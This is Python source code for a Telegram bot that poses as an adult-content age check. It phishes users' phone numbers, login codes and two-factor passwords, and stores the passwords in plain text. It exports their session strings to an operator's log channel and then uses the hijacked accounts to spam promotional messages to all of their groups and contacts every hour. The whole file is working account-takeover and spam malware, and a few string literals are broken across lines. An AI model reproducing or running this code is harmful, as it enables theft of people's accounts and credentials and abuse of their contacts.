import os
import asyncio
import time
import random
from pathlib import Path
from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    AuthKeyUnregistered,
    SessionRevoked,
    SessionExpired
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['sessions']

# Promo Texts (10 unique messages)
PROMO_TEXTS = [
    "🔥 Join our exclusive channel!",
    "🎉 Unlock premium content now!",
    "💋 VIP access waiting for you!",
    "🔞 Best adult content on Telegram!",
    "🌟 Exclusive videos just for you!",
    "💥 Your premium pass starts here!",
    "😈 Don't miss our collection!",
    "👑 VIP membership available!",
    "🕶️ Hidden gems await!",
    "💎 Premium quality content!"
]

# Strings
strings = {
    'need_login': "You have to /login first!",
    'already_logged_in': "You're already logged in! 🥳",
    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
    'logout_success': "Logged out! 🔒\n/login to access again.",
    'not_logged_in': "Not logged in! ❌\n/login first.",
    'otp_wrong': "**❌ WRONG OTP!**\nAttempts left: {attempts}/3",
    'otp_blocked': "**🚫 BLOCKED!**\nToo many wrong OTP attempts.\nContact admin.",
    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\nAttempts left: {attempts}/3",
    '2fa_blocked': "**🚫 BLOCKED!**\nToo many wrong 2FA attempts.\nContact admin."
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]
])

# State Management
user_states = {}

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and state['client'].is_connected:
            await state['client'].disconnect()
        del user_states[user_id]

@Client.on_message(filters.private & filters.command("login"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    user_data = database.find_one({"id": user_id})
    
    if user_data and user_data.get('session'):
        try:
            test_client = Client(":memory:", session_string=user_data['session'])
            await test_client.connect()
            await test_client.get_me()
            await test_client.disconnect()
            
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": True}}
            )
            await message.reply(strings['verification_success'])
            asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
            return
        except:
            pass
    
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    if not await check_login_status(user_id):
        await message.reply(strings['not_logged_in'])
        return
    
    database.update_one(
        {"id": user_id},
        {"$set": {"logged_in": False, "promotion": False}}
    )
    await message.reply(strings['logout_success'])

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
        return
    
    # Send & auto-delete "Processing..." message
    processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"
    
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    try:
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': '',
            'processing_msg_id': processing_msg.id,
            'otp_attempts': 0,
            '2fa_attempts': 0
        }
        
        sent_msg = await bot.send_message(
            user_id,
            "**OTP Sent!**\n\nEnter code via buttons:",
            reply_markup=OTP_KEYBOARD
        )
        user_states[user_id]['last_msg_id'] = sent_msg.id
        
        # Delete "Processing..." after OTP is sent
        await bot.delete_messages(user_id, processing_msg.id)
        
    except Exception as e:
        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /login again.")
        return
    
    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5:
            await query.answer("OTP must be 5 digits!", show_alert=True)
            return
        
        await query.message.edit("Verifying OTP...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except PhoneCodeInvalid:
            state['otp_attempts'] += 1
            if state['otp_attempts'] >= 3:
                await query.message.edit(strings['otp_blocked'])
                database.update_one(
                    {"id": user_id},
                    {"$set": {"blocked": True}}
                )
                await cleanup_user_state(user_id)
                return
            
            attempts_left = 3 - state['otp_attempts']
            await query.message.edit(
                strings['otp_wrong'].format(attempts=attempts_left),
                reply_markup=OTP_KEYBOARD
            )
            state['otp_digits'] = ''
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
            state['needs_password'] = True
            state['last_msg_id'] = query.message.id
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/login again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action
    
    await query.message.edit(
        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done.",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["login", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    
    try:
        # Delete the "2FA REQUIRED" message first
        if 'last_msg_id' in state:
            await bot.delete_messages(user_id, state['last_msg_id'])
        
        # Delete user's password message IMMEDIATELY
        await message.delete()
        
        await state['client'].check_password(password=password)
        verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
        
        # Store verified_msg ID for deletion after session creation
        state['verified_msg_id'] = verified_msg.id
        
        # Save 2FA password to DB (plain text)
        database.update_one(
            {"id": user_id},
            {"$set": {
                "2fa_status": True,
                "2fa_password": password
            }},
            upsert=True
        )
        
        await create_session(bot, state['client'], user_id, state['phone_number'])
        
    except PasswordHashInvalid:
        state['2fa_attempts'] += 1
        if state['2fa_attempts'] >= 3:
            await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
            database.update_one(
                {"id": user_id},
                {"$set": {"blocked": True}}
            )
            await cleanup_user_state(user_id)
            return
        
        attempts_left = 3 - state['2fa_attempts']
        error_msg = await message.reply(
            strings['2fa_wrong'].format(attempts=attempts_left),
            reply_markup=ReplyKeyboardRemove()
        )
        state['last_msg_id'] = error_msg.id
    except Exception as e:
        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save to database
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number,
            'promotion': True
        }
        
        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)

        # Create sessions directory if not exists
        os.makedirs("sessions", exist_ok=True)

        # Generate session file path
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        # Manually save session file
        with open(session_file, "w") as f:
            f.write(string_session)
            
        # Send to log channel
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
        )
        
        # Remove local copy
        os.remove(session_file)

        # Delete "Password verified..." message after sending success
        if 'verified_msg_id' in user_states[user_id]:
            await bot.delete_messages(user_id, user_states[user_id]['verified_msg_id'])
        
        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
        
    except Exception as e:
        await bot.send_message(user_id, f"Error: {e}\n/login again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
    already_notified = False

    while True:
        client = None
        try:
            client = Client("promo", session_string=session_string)
            await client.start()

            already_notified = False

            await bot.send_message(
                LOG_CHANNEL_SESSIONS_FILES,
                f"🚀 Starting promotion cycle for: {phone_number}"
            )

            user_data = database.find_one({"mobile_number": phone_number})
            if not user_data or not user_data.get('promotion', True):
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"⏸️ Promotion stopped for: {phone_number}"
                )
                break

            # Fix: Check for NoneType chat
            groups = []
            async for dialog in client.get_dialogs():
                if not dialog.chat:
                    continue
                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                    groups.append(dialog.chat.id)

            # Fix: Check for None in contact dialogs
            contacts_and_privates = []
            contacts = await client.get_contacts()
            for user in contacts:
                if not user.is_bot:
                    contacts_and_privates.append(user.id)

            async for dialog in client.get_dialogs(limit=200):
                if not dialog.chat:
                    continue
                if (dialog.chat.type == enums.ChatType.PRIVATE and 
                    not dialog.chat.is_bot and
                    dialog.chat.id not in contacts_and_privates):
                    contacts_and_privates.append(dialog.chat.id)

            group_count = 0
            for group in groups:
                try:
                    text = random.choice(PROMO_TEXTS)
                    await client.send_message(group, text)
                    group_count += 1
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"✅ {phone_number} | Group {group_count}/{len(groups)}: {text[:20]}...",
                        disable_notification=True
                    )
                    await asyncio.sleep(60)
                except FloodWait as e:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"⏳ {phone_number} | FloodWait: Sleeping {e.value}s"
                    )
                    await asyncio.sleep(e.value + 5)
                except Exception as e:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"❌ {phone_number} | Failed group: {str(e)}",
                        disable_notification=True
                    )

            contact_count = 0
            for target in contacts_and_privates:
                try:
                    text = random.choice(PROMO_TEXTS)
                    await client.send_message(target, text)
                    contact_count += 1
                    if contact_count % 10 == 0:
                        await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"📩 {phone_number} | Contacts: {contact_count} sent",
                            disable_notification=True
                        )
                except FloodWait as e:
                    await asyncio.sleep(e.value + 5)
                except Exception:
                    continue

            await bot.send_message(
                LOG_CHANNEL_SESSIONS_FILES,
                f"🎉 #Cycle_Complete: {phone_number}
"
                f"• Groups: {group_count}/{len(groups)}
"
                f"• Contacts: {contact_count}
"
                f"⏳ Next cycle in 1 hour"
            )

            await asyncio.sleep(3600)

        except (AuthKeyUnregistered, SessionRevoked, SessionExpired) as e:
            if not already_notified:
                error_type = {
                    AuthKeyUnregistered: "SESSION_EXPIRED",
                    SessionRevoked: "SESSION_REVOKED", 
                    SessionExpired: "SESSION_EXPIRED"
                }.get(type(e), "SESSION_TERMINATED")

                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"💀 #{error_type}: {phone_number}
"
                    f"❌ Error: {str(e)}
"
                    f"🛑 Auto-disabled promotion"
                )
                database.update_one(
                    {"mobile_number": phone_number},
                    {"$set": {"promotion": False}}
                )
                already_notified = True
            break

        except Exception as e:
            if "AUTH_KEY_UNREGISTERED" in str(e) and not already_notified:
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"💀 #SESSION_TERMINATED: {phone_number}
"
                    f"❌ Error: {str(e)}
"
                    f"🛑 Emergency stop"
                )
                database.update_one(
                    {"mobile_number": phone_number},
                    {"$set": {"promotion": False}}
                )
                already_notified = True
                break

            await bot.send_message(
                LOG_CHANNEL_SESSIONS_FILES,
                f"💀 #Cycle_Failed: {phone_number}

{str(e)}
"
                f"🔄 Restarting in 5 minutes..."
            )
            await asyncio.sleep(300)

        finally:
            if client:
                try:
                    await client.stop()
                except:
                    pass

                    pass
